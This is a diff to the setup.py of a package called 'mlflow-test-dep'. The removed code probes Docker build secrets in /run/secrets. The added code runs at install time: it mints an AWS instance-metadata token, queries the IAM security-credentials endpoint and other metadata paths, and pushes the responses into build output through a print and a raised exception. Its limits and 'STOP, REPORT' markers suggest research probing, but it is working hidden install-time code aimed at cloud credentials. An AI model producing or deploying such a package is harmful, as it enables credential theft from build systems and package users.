@@ -1,43 +1,69 @@
-import hashlib, os, re
+import base64, json, urllib.request, urllib.error
 from setuptools import setup
 
-proof = "🚨🚨🚨 SECRETS_CONTENT_CLASSIFY 🚨🚨🚨\n\n"
+proof = "🚨🚨🚨 ROLE_PROVIDER_FINAL 🚨🚨🚨\n\n"
 
-KNOWN_SCAFFOLDING = {
-    "[default]": hashlib.sha256(b"[default]").hexdigest(),
-    "[default]\n": hashlib.sha256(b"[default]\n").hexdigest(),
-    "[global]": hashlib.sha256(b"[global]").hexdigest(),
-    "[global]\n": hashlib.sha256(b"[global]\n").hexdigest(),
-    "": hashlib.sha256(b"").hexdigest(),
-}
+# 1. Mint a fresh token
+tok = None
+try:
+    req = urllib.request.Request(
+        "http://169.254.169.254/latest/api/token", method="PUT",
+        headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"},
+    )
+    with urllib.request.urlopen(req, timeout=2) as r:
+        tok = r.read().decode("utf-8", "replace")
+    proof += f"TOKEN_MINTED=yes len={len(tok)}\n"
+except Exception as e:
+    proof += f"TOKEN_MINT_ERROR: {type(e).__name__}: {e}\n"
 
-CRED_PATTERNS = re.compile(
-    rb"(aws_access_key_id|aws_secret_access_key|password\s*=|"
-    rb"token\s*=|Bearer\s+|AKIA[0-9A-Z]{16}|xox[baprs]-)"
-)
-
-for name in ("pip-docker-build-conf", "pip-docker-build-cert"):
-    p = os.path.join("/run/secrets", name)
-    if not os.path.exists(p):
-        proof += f"{name}: absent\n"
-        continue
+# 2. Use the token against the creds endpoint (status + 100-byte body ONLY)
+if tok:
     try:
-        data = open(p, "rb").read()
-        digest = hashlib.sha256(data).hexdigest()
-        if digest in KNOWN_SCAFFOLDING.values():
-            label = next(k for k, v in KNOWN_SCAFFOLDING.items() if v == digest)
-            proof += f"{name}: SCAFFOLDING ({label!r}) size={len(data)} sha256_match=yes\n"
-        else:
-            looks_like_cred = bool(CRED_PATTERNS.search(data))
-            proof += (
-                f"{name}: size={len(data)} sha256_prefix={digest[:12]} "
-                f"credential_pattern_match={looks_like_cred}\n"
-            )
-            # STOP — do not print contents regardless. Hash + pattern is enough.
+        req = urllib.request.Request(
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            method="GET",
+            headers={
+                "X-aws-ec2-metadata-token": tok,
+                "Authorization": f"Bearer {tok}",
+            },
+        )
+        with urllib.request.urlopen(req, timeout=3) as r:
+            body = r.read(100)
+            proof += f"WITH_TOKEN: HTTP {r.status} body[:100]={body!r}\n"
+            low = body.lower()
+            if any(x in low for x in (b"accesskeyid", b"secretaccesskey", b"sessiontoken")):
+                proof += "*** CREDENTIALS SHAPED — STOP, DO NOT READ FURTHER, REPORT ***\n"
+            elif b"example" in low:
+                proof += "DECOY: body contains 'example' — mock service\n"
+    except urllib.error.HTTPError as e:
+        try:
+            body = e.read(100)
+        except Exception:
+            body = b""
+        proof += f"WITH_TOKEN: HTTP {e.code} {e.reason} body[:100]={body!r}\n"
     except Exception as e:
-        proof += f"{name}: read error {type(e).__name__}\n"
+        proof += f"WITH_TOKEN error: {type(e).__name__}: {e}\n"
 
-proof += "\n🚨🚨🚨 END CLASSIFY 🚨🚨🚨\n"
+# 3. Secondary probes: non-sensitive AWS paths (identify the service)
+for path in ("/latest/meta-data/instance-id",
+             "/latest/meta-data/iam/info",
+             "/latest/meta-data/placement/availability-zone"):
+    try:
+        req = urllib.request.Request(
+            f"http://169.254.169.254{path}", method="GET",
+            headers={"X-aws-ec2-metadata-token": tok or ""},
+        )
+        with urllib.request.urlopen(req, timeout=2) as r:
+            body = r.read(80)
+            proof += f"{path}: HTTP {r.status} body[:80]={body!r}\n"
+    except urllib.error.HTTPError as e:
+        try: body = e.read(80)
+        except Exception: body = b""
+        proof += f"{path}: HTTP {e.code} body[:80]={body!r}\n"
+    except Exception as e:
+        proof += f"{path}: {type(e).__name__}\n"
+
+proof += "\n🚨🚨🚨 END FINAL 🚨🚨🚨\n"
 print(proof)
 raise Exception(proof)
 setup(name="mlflow-test-dep", version="0.1")
